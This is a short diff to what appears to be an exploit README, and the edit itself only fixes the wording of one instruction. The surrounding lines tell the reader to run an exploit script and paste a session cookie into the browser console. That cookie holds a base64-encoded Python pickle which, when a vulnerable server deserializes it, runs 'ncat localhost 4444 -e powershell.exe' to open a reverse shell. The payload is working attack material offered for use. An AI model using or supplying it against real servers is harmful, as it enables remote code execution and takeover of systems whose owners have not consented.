@@ -35,7 +35,7 @@ Then run:
 python3 exploit_rvs_web.py
 ```
 
-And then in web console put the paste it in cookies, like:
+And then in web console, paste it in cookies, like:
 ```
 document.cookie = 'session=gASVQAAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjCVuY2F0IGxvY2FsaG9zdCA0NDQ0IC1lIHBvd2Vyc2hlbGwuZXhllIWUUpQu'
 ```
